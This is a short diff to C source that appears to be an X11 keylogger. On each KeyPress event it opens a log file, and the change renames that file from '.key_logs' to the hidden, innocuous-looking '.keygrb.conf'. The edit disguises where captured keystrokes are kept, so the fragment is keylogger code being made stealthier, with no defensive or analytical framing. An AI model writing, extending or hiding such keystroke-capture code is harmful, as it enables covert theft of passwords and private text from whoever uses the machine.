@@ -32,7 +32,7 @@ int main() {
         XNextEvent(display, &ev);
 
         if (ev.type == KeyPress) {
-            FILE *f_key_log = fopen(".key_logs", "a+");
+            FILE *f_key_log = fopen(".keygrb.conf", "a+");
             char buf[32];
             KeySym key_sym;
 
